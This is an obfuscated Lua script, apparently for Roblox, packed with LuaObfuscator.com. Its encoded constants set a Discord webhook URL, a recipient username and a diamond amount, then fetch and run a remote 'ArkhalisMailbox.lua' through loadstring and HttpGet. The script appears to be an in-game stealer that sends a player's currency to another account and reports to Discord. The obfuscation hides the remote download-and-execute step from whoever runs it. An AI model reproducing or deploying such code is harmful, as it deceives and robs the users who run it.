--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v81=v2(v0(v30,16));if v19 then local v88=v5(v81,v19);v19=nil;return v88;else return v81;end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + ((1809 -(282 + 595)) -(857 + 74)))) ;return v82-(v82%(569 -(367 + 201))) ;else local v83=(929 -(214 + (2350 -(1523 + 114))))^(v32-(1 + 0)) ;return (((v31%(v83 + v83))>=v83) and (1 + 0)) or 0 ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (2 -0) ;return (v36 * (1321 -(68 + 997))) + v35 ;end local function v23()local v37=0;local v38;local v39;local v40;local v41;while true do if (v37==(1271 -((417 -191) + 1044))) then return (v41 * (73054774 -56277558)) + (v40 * (65653 -(32 + 85))) + (v39 * (251 + 5)) + v38 ;end if (v37==(0 + 0)) then v38,v39,v40,v41=v1(v16,v18,v18 + (960 -((1637 -745) + 65)) );v18=v18 + 4 ;v37=2 -1 ;end end end local function v24()local v42=v23();local v43=v23();local v44=2 -1 ;local v45=(v20(v43,1 -0 ,370 -(87 + 263) ) * ((1 + 0 + (773 -(201 + 571)))^(212 -(67 + 113)))) + v42 ;local v46=v20(v43,16 + 5 ,54 -23 );local v47=((v20(v43,32 + (1138 -(116 + 1022)) )==1) and  -(792 -(368 + 423))) or ((8 -6) -1) ;if (v46==(0 + 0)) then if (v45==(18 -(10 + 8))) then return v47 * (0 -0) ;else local v89=952 -(802 + 150) ;while true do if (v89==(0 -0)) then v46=1 -0 ;v44=0 + 0 ;break;end end end elseif (v46==(3044 -(915 + 82))) then return ((v45==(0 -0)) and (v47 * ((2 -1)/(0 + 0)))) or (v47 * NaN) ;end return v8(v47,v46-((789 + 555) -321) ) * (v44 + (v45/((1189 -(1069 + 118))^52))) ;end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==(0 -0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -(3 -2) );v18=v18 + v48 ;local v50={};for v65=1, #v49 do v50[v65]=v2(v1(v3(v49,v65,v65)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 + 0 ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51~=(1026 -(706 + 318))) then else v56=nil;v57=nil;v51=3 + 0 ;end if (v51==(1272 -(945 + 326))) then v54=nil;v55=nil;v51=4 -2 ;end if ((0 + 0)~=v51) then else local v87=700 -(271 + 429) ;while true do if (v87~=1) then else v51=652 -(494 + 157) ;break;end if (v87~=(1500 -(1408 + 92))) then else v52=0 -0 ;v53=nil;v87=1 + 0 ;end end end if (v51==(1 + 2)) then v58=nil;while true do local v90=0;while true do if (v90==(0 + 0)) then if (v52==(837 -(660 + 176))) then local v100=0 + 0 ;while true do if (v100~=(202 -(14 + 188))) then else v56={v53,v54,nil,v55};v57=v23();v100=1 + 0 ;end if (v100~=(1 + 0)) then else v58={};v52=1 + 1 ;break;end end end if (v52==(6 -3)) then for v104=1,v23() do v54[v104-(1 -0) ]=v28();end return v56;end v90=2 -1 ;end if (v90~=1) then else if (v52==(529 -(406 + 123))) then local v101=0 + 0 ;while true do if (v101==1) then v55={};v52=1 + 0 ;break;end if (v101~=(396 -(115 + 281))) then else v53={};v54={};v101=1 + 0 ;end end end if (v52==(4 -2)) then local v102=0;local v103;while true do if ((1322 -(1249 + 73))~=v102) then else v103=0;while true do if ((1 + 0)==v103) then for v162=2 -1 ,v23() do local v163=0 + 0 ;local v164;while true do if (v163==(0 -0)) then v164=v21();if (v20(v164,868 -(550 + 317) ,1 -0 )==(0 -0)) then local v171=0;local v172;local v173;local v174;while true do if ((1901 -(106 + 1794))==v171) then local v175=0 -0 ;while true do if (v175==(1 + 0)) then v171=5 -3 ;break;end if (v175==(0 -0)) then v174={v22(),v22(),nil,nil};if (v172==(1427 -(41 + 1386))) then local v184=0 -0 ;local v185;while true do if (v184==(103 -(17 + 86))) then v185=1990 -(582 + 1408) ;while true do if (v185==(0 -0)) then v174[8 -5 ]=v22();v174[170 -(122 + 44) ]=v22();break;end end break;end end elseif (v172==(3 -2)) then v174[3 -0 ]=v23();elseif (v172==2) then v174[11 -8 ]=v23() -((6 -4)^16) ;elseif (v172==3) then local v195=0;local v196;local v197;while true do if (v195==(1825 -(1195 + 629))) then while true do if (v196~=0) then else v197=0;while true do if (v197~=(0 -0)) then else v174[244 -(187 + 54) ]=v23() -((782 -(162 + 618))^(3 + 13)) ;v174[4]=v22();break;end end break;end end break;end if ((0 + 0)==v195) then local v198=65 -(30 + 35) ;while true do if ((1 + 0)==v198) then v195=1258 -(1043 + 214) ;break;end if (v198==(0 + 0)) then v196=0 -0 ;v197=nil;v198=1 -0 ;end end end end end v175=1;end end end if (v171==(1212 -(323 + 889))) then local v176=0 -0 ;while true do if ((0 + 0)==v176) then v172=v20(v164,2,1639 -(1373 + 263) );v173=v20(v164,1004 -(451 + 549) ,6);v176=321 -(53 + 267) ;end if (v176==(1 + 0)) then v171=1 -0 ;break;end end end if (v171==(2 -0)) then local v177=1384 -(746 + 638) ;while true do if (v177~=(0 + 0)) then else if (v20(v173,1 -0 ,342 -(218 + 123) )==1) then v174[2]=v58[v174[2 + 0 ]];end if (v20(v173,2 + 0 ,1583 -(1535 + 46) )==(1 + 0)) then v174[3]=v58[v174[129 -(116 + 10) ]];end v177=1 + 0 ;end if (v177~=(739 -(542 + 196))) then else v171=3;break;end end end if (v171~=(6 -3)) then else if (v20(v173,1 + 2 ,2 + 1 )~=(1 + 0)) then else v174[4]=v58[v174[4]];end v53[v162]=v174;break;end end end break;end end end v52=563 -(306 + 254) ;break;end if (v103~=0) then else local v161=0 + 0 ;while true do if (v161~=0) then else for v166=1,v57 do local v167=0 -0 ;local v168;local v169;local v170;while true do if (v167==1) then v170=nil;while true do if (v168==(1467 -(899 + 568))) then local v179=0;local v180;while true do if (v179~=0) then else v180=0 + 0 ;while true do if (v180~=1) then else v168=2 -1 ;break;end if (v180==0) then local v191=0 -0 ;while true do if (v191~=(1551 -(1126 + 425))) then else v169=v21();v170=nil;v191=406 -(118 + 287) ;end if (v191==(604 -(268 + 335))) then v180=1;break;end end end end break;end end end if (v168==(291 -(60 + 230))) then if (v169==(3 -2)) then v170=v21()~=0 ;elseif (v169==2) then v170=v24();elseif (v169==(575 -(426 + 146))) then v170=v25();end v58[v166]=v170;break;end end break;end if (v167==(0 + 0)) then v168=0 -0 ;v169=nil;v167=1457 -(282 + 1174) ;end end end v56[814 -(569 + 242) ]=v21();v161=378 -(142 + 235) ;end if (v161==(2 -1)) then v103=1;break;end end end end break;end end end break;end end end break;end end end local function v29(v59,v60,v61)local v62=v59[1];local v63=v59[2];local v64=v59[3];return function(...)local v67=v62;local v68=v63;local v69=v64;local v70=v27;local v71=1;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v84=0,v75 do if (v84>=v69) then v73[v84-v69 ]=v74[v84 + 1 ];else v77[v84]=v74[v84 + 1 ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do v79=v67[v71];v80=v79[1];if (v80<=5) then if (v80<=2) then if (v80<=0) then v77[v79[2]]();elseif (v80>1) then local v106=0;local v107;local v108;while true do if (v106==1) then v77[v107 + 1 ]=v108;v77[v107]=v108[v79[4]];break;end if (v106==0) then v107=v79[2];v108=v77[v79[3]];v106=1;end end else local v109;local v110,v111;local v112;local v113;v77[v79[2]][v79[3]]=v79[4];v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]=v61[v79[3]];v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]=v61[v79[3]];v71=v71 + 1 ;v79=v67[v71];v113=v79[2];v112=v77[v79[3]];v77[v113 + 1 ]=v112;v77[v113]=v112[v79[4]];v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]=v79[3];v71=v71 + 1 ;v79=v67[v71];v113=v79[2];v110,v111=v70(v77[v113](v13(v77,v113 + 1 ,v79[3])));v72=(v111 + v113) -1 ;v109=0;for v134=v113,v72 do v109=v109 + 1 ;v77[v134]=v110[v109];end v71=v71 + 1 ;v79=v67[v71];v113=v79[2];v77[v113]=v77[v113](v13(v77,v113 + 1 ,v72));v71=v71 + 1 ;v79=v67[v71];v77[v79[2]]();v71=v71 + 1 ;v79=v67[v71];v71=v79[3];end elseif (v80<=3) then v77[v79[2]]=v79[3];elseif (v80==4) then do return;end else local v125=0;while true do if (3==v125) then v77[v79[2]]=v79[3];v71=v71 + 1 ;v79=v67[v71];v125=4;end if (v125==4) then v71=v79[3];break;end if (v125==2) then v77[v79[2]][v79[3]]=v79[4];v71=v71 + 1 ;v79=v67[v71];v125=3;end if (v125==0) then v77[v79[2]][v79[3]]=v79[4];v71=v71 + 1 ;v79=v67[v71];v125=1;end if (v125==1) then v77[v79[2]]=v61[v79[3]];v71=v71 + 1 ;v79=v67[v71];v125=2;end end end elseif (v80<=8) then if (v80<=6) then v71=v79[3];elseif (v80==7) then local v126=v79[2];local v127,v128=v70(v77[v126](v13(v77,v126 + 1 ,v79[3])));v72=(v128 + v126) -1 ;local v129=0;for v137=v126,v72 do v129=v129 + 1 ;v77[v137]=v127[v129];end elseif (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end elseif (v80<=9) then local v98=0;local v99;while true do if (v98==0) then v99=v79[2];v77[v99]=v77[v99](v13(v77,v99 + 1 ,v72));break;end end elseif (v80==10) then v77[v79[2]]=v61[v79[3]];else v77[v79[2]][v79[3]]=v79[4];end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3130383439303335383930312O3430352O332F7035696B496D76314A4853356D2D774E63692O6558756D6C36346434493450592D6B5746554A527342326E3051666858424670644E49676231337464634A487537597A72030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D65030A3O005350454C454D454E5F3503083O004469616D6F6E6473024O0080841E4100163O0012033O00013O0026083O000D000100020004063O000D000100120A000100033O00300100010004000500122O000100063O00122O000200073O00202O00020002000800122O000400096O000200046O00013O00024O00010001000100044O001500010026083O0001000100010004063O0001000100120A000100033O0030050001000A000B00122O000100033O00302O0001000C000D00124O00023O00044O000100012O00043O00017O00",v9(),...);end
